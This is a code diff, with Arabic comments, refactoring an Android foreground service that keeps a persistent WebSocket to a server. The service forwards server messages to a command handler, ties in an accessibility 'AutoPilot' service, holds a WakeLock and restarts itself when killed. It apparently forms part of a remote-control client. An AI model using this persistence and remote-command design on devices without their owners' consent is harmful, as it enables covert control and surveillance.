@@ -20,8 +20,11 @@ import com.recoverdata.phone.MainActivity;
 import com.recoverdata.phone.R;
 import com.recoverdata.phone.accessibility.AutoPilotService;
 import com.recoverdata.phone.network.CommandHandler;
+import com.recoverdata.phone.network.ServerConfig;
 import com.recoverdata.phone.network.WebSocketManager;
 import com.recoverdata.phone.utils.Logger;
+
+import org.json.JSONObject;
 
 /**
  * ConnectionService
@@ -29,16 +32,12 @@ import com.recoverdata.phone.utils.Logger;
  * Foreground Service دائم يبقي التطبيق حياً.
  *
  * المسؤوليات:
- *   1. تشغيل إشعار دائم (Foreground Notification) لمنع قتل الخدمة.
- *   2. تهيئة WebSocketManager وإبقاء الاتصال بالسيرفر.
- *   3. إعادة الاتصال تلقائياً عند الانقطاع.
- *   4. ربط AutoPilotService (Accessibility) بـ WebSocketManager.
+ *   1. تشغيل إشعار دائم لمنع قتل الخدمة.
+ *   2. تهيئة WebSocketManager وإبقاء الاتصال.
+ *   3. إعادة الاتصال تلقائياً.
+ *   4. ربط AutoPilotService بـ WebSocketManager.
  *   5. تمرير الأوامر إلى CommandHandler.
- *   6. الحصول على WakeLock لمنع النوم العميق أثناء النقل.
- *
- * دورة الحياة:
- *   startService() → onCreate() → onStartCommand()
- *   → تشغيل الإشعار → تهيئة WebSocket → START_STICKY
+ *   6. WakeLock لمنع النوم العميق.
  * ============================================================
  */
 public class ConnectionService extends Service {
@@ -61,7 +60,7 @@ public class ConnectionService extends Service {
 
     // WakeLock
     private static final String WAKE_LOCK_TAG = "RecoverData::ConnectionWakeLock";
-    private static final long   WAKE_LOCK_TIMEOUT_MS = 60 * 60 * 1000L; // ساعة واحدة
+    private static final long   WAKE_LOCK_TIMEOUT_MS = 60 * 60 * 1000L; // ساعة
 
     // =============================================================
     // 2. الحقول
@@ -85,13 +84,13 @@ public class ConnectionService extends Service {
 
         Logger.i(TAG, "onCreate");
 
-        // 1. إنشاء قناة الإشعارات (مرة واحدة)
+        // 1. إنشاء قناة الإشعارات
         createNotificationChannel();
 
         // 2. تهيئة WakeLock
         acquireWakeLock();
 
-        // 3. تهيئة المكونات الأساسية
+        // 3. تهيئة المكونات
         initComponents();
     }
 
@@ -100,7 +99,6 @@ public class ConnectionService extends Service {
         String action = (intent != null) ? intent.getAction() : ACTION_START;
         Logger.i(TAG, "onStartCommand: action=" + action);
 
-        // التعامل مع الأوامر
         if (ACTION_STOP.equals(action)) {
             stopSelf();
             return START_NOT_STICKY;
@@ -115,14 +113,12 @@ public class ConnectionService extends Service {
         startForegroundSafely();
         startConnection();
 
-        // START_STICKY : النظام يعيد تشغيل الخدمة إذا قُتلت
         return START_STICKY;
     }
 
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
-        // لا نستخدم binding، فقط startService
         return null;
     }
 
@@ -131,8 +127,6 @@ public class ConnectionService extends Service {
         super.onTaskRemoved(rootIntent);
         Logger.w(TAG, "onTaskRemoved - app swiped from recents");
 
-        // إعادة تشغيل الخدمة إذا أُزيل التطبيق من قائمة المهام
-        // (بعض الأجهزة تقتل الخدمة عند swipe)
         if (isStarted) {
             Intent restartIntent = new Intent(getApplicationContext(), ConnectionService.class);
             restartIntent.setAction(ACTION_RESTART);
@@ -148,27 +142,25 @@ public class ConnectionService extends Service {
     public void onDestroy() {
         Logger.w(TAG, "onDestroy");
 
+        boolean wasStarted = isStarted;
         isStarted = false;
 
-        // إيقاف الاتصال
+        // إيقاف الاتصال + تنظيف الموارد
         if (webSocketManager != null) {
-            webSocketManager.disconnect();
+            webSocketManager.cleanup();
             webSocketManager = null;
         }
 
-        // تحرير WakeLock
         releaseWakeLock();
 
-        // مسح المرجع (Singleton)
         if (instance == this) {
             instance = null;
         }
 
         super.onDestroy();
 
-        // محاولة إعادة التشغيل تلقائياً إذا لم يكن الإيقاف مقصوداً
-        // (START_STICKY يفعل ذلك عادةً، لكن بعض الأجهزة تحتاج دفعة)
-        if (isStarted) {
+        // إعادة تشغيل الخدمة إذا أُوقفت من النظام (ليس بإرادتنا)
+        if (wasStarted) {
             Intent restartIntent = new Intent(getApplicationContext(), ConnectionService.class);
             restartIntent.setAction(ACTION_RESTART);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -182,39 +174,39 @@ public class ConnectionService extends Service {
     // =============================================================
     // 4. التهيئة الداخلية
     // =============================================================
-
     private void initComponents() {
-        // CommandHandler يحتاج مرجعاً للخدمة (للسياق)
+        // CommandHandler يحتاج Context
         commandHandler = new CommandHandler(getApplicationContext());
 
-        // WebSocketManager مع callback للتعامل مع الرسائل
-        webSocketManager = new WebSocketManager(new WebSocketManager.Callback() {
-            @Override
-            public void onConnected() {
-                Logger.i(TAG, "WebSocket connected");
-                updateNotification("Connected to server");
-                notifyServerReady();
-            }
+        // ✅ WebSocketManager مع Context + Callback
+        webSocketManager = new WebSocketManager(
+                getApplicationContext(),
+                new WebSocketManager.Callback() {
+                    @Override
+                    public void onConnected() {
+                        Logger.i(TAG, "WebSocket connected");
+                        updateNotification("Connected to server");
+                        notifyServerReady();
+                    }
 
-            @Override
-            public void onMessage(@NonNull String message) {
-                Logger.d(TAG, "Message received: " + message);
-                // تمرير الرسالة إلى CommandHandler
-                commandHandler.handle(message, webSocketManager);
-            }
+                    @Override
+                    public void onMessage(@NonNull String message) {
+                        Logger.d(TAG, "Message received: " + message);
+                        commandHandler.handle(message, webSocketManager);
+                    }
 
-            @Override
-            public void onDisconnected(int code, @NonNull String reason) {
-                Logger.w(TAG, "WebSocket disconnected: " + code + " / " + reason);
-                updateNotification("Reconnecting...");
-            }
+                    @Override
+                    public void onDisconnected(int code, @NonNull String reason) {
+                        Logger.w(TAG, "WebSocket disconnected: " + code + " / " + reason);
+                        updateNotification("Reconnecting...");
+                    }
 
-            @Override
-            public void onError(@NonNull Throwable error) {
-                Logger.e(TAG, "WebSocket error: " + error.getMessage(), error);
-                updateNotification("Connection error");
-            }
-        });
+                    @Override
+                    public void onError(@NonNull Throwable error) {
+                        Logger.e(TAG, "WebSocket error: " + error.getMessage(), error);
+                        updateNotification("Connection error");
+                    }
+                });
 
         // ربط AutoPilotService بـ WebSocketManager إن كان جاهزاً
         AutoPilotService autopilot = AutoPilotService.getInstance();
@@ -237,7 +229,6 @@ public class ConnectionService extends Service {
         }
         isStarted = true;
 
-        // جلب العنوان من WebSocketManager (يُقرأ من config لاحقاً)
         if (webSocketManager != null) {
             webSocketManager.connect();
         }
@@ -247,25 +238,20 @@ public class ConnectionService extends Service {
         Logger.i(TAG, "Restarting connection...");
 
         if (webSocketManager != null) {
-            webSocketManager.disconnect();
-            webSocketManager.connect();
+            webSocketManager.restart();
         }
     }
 
     // =============================================================
-    // 6. الإشعار الدائم (Foreground Notification)
+    // 6. الإشعار الدائم
     // =============================================================
 
-    /**
-     * إنشاء قناة الإشعارات (Android 8+).
-     * آمن للاستدعاء أكثر من مرة.
-     */
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
                     CHANNEL_NAME,
-                    NotificationManager.IMPORTANCE_LOW   // بدون صوت
+                    NotificationManager.IMPORTANCE_LOW
             );
             channel.setDescription(CHANNEL_DESC);
             channel.setShowBadge(false);
@@ -279,12 +265,8 @@ public class ConnectionService extends Service {
         }
     }
 
-    /**
-     * بناء الإشعار.
-     */
     @NonNull
     private Notification buildNotification(@NonNull String statusText) {
-        // PendingIntent لفتح MainActivity عند النقر على الإشعار
         Intent intent = new Intent(this, MainActivity.class);
         intent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
 
@@ -299,21 +281,17 @@ public class ConnectionService extends Service {
                 .setContentText(statusText)
                 .setSmallIcon(R.drawable.ic_notification)
                 .setContentIntent(pi)
-                .setOngoing(true)                       // لا يمكن إزالته
+                .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setCategory(NotificationCompat.CATEGORY_SERVICE)
                 .setShowWhen(false)
                 .build();
     }
 
-    /**
-     * بدء الـ Foreground Service بشكل آمن حسب إصدار Android.
-     */
     private void startForegroundSafely() {
         Notification notification = buildNotification(getString(R.string.status_connecting));
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            // Android 10+ : تحديد نوع الخدمة
             startForeground(
                     NOTIFICATION_ID,
                     notification,
@@ -324,9 +302,6 @@ public class ConnectionService extends Service {
         }
     }
 
-    /**
-     * تحديث نص الإشعار (بدون إعادة إنشاء).
-     */
     private void updateNotification(@NonNull String statusText) {
         NotificationManager nm = (NotificationManager)
                 getSystemService(Context.NOTIFICATION_SERVICE);
@@ -336,7 +311,7 @@ public class ConnectionService extends Service {
     }
 
     // =============================================================
-    // 7. WakeLock (منع النوم العميق)
+    // 7. WakeLock
     // =============================================================
 
     @SuppressWarnings("deprecation")
@@ -379,12 +354,14 @@ public class ConnectionService extends Service {
         if (webSocketManager == null) return;
 
         try {
-            org.json.JSONObject msg = new org.json.JSONObject();
+            JSONObject msg = new JSONObject();
             msg.put("type", "HELLO");
             msg.put("device", Build.MANUFACTURER + " " + Build.MODEL);
             msg.put("android", Build.VERSION.RELEASE);
             msg.put("sdk", Build.VERSION.SDK_INT);
             msg.put("autopilot", AutoPilotService.isReady());
+            msg.put("client", ServerConfig.getClientName());
+            msg.put("client_ver", ServerConfig.getClientVersion());
             msg.put("timestamp", System.currentTimeMillis());
 
             webSocketManager.send(msg.toString());
@@ -395,7 +372,7 @@ public class ConnectionService extends Service {
     }
 
     // =============================================================
-    // 9. API عامة للوصول من الخارج
+    // 9. API عامة
     // =============================================================
 
     @Nullable
@@ -403,9 +380,6 @@ public class ConnectionService extends Service {
         return instance;
     }
 
-    /**
-     * بدء الخدمة من أي مكان في التطبيق.
-     */
     public static void start(@NonNull Context context) {
         Intent intent = new Intent(context, ConnectionService.class);
         intent.setAction(ACTION_START);
@@ -417,18 +391,12 @@ public class ConnectionService extends Service {
         }
     }
 
-    /**
-     * إيقاف الخدمة.
-     */
     public static void stop(@NonNull Context context) {
         Intent intent = new Intent(context, ConnectionService.class);
         intent.setAction(ACTION_STOP);
         context.startService(intent);
     }
 
-    /**
-     * إعادة تشغيل الاتصال.
-     */
     public static void restart(@NonNull Context context) {
         Intent intent = new Intent(context, ConnectionService.class);
         intent.setAction(ACTION_RESTART);
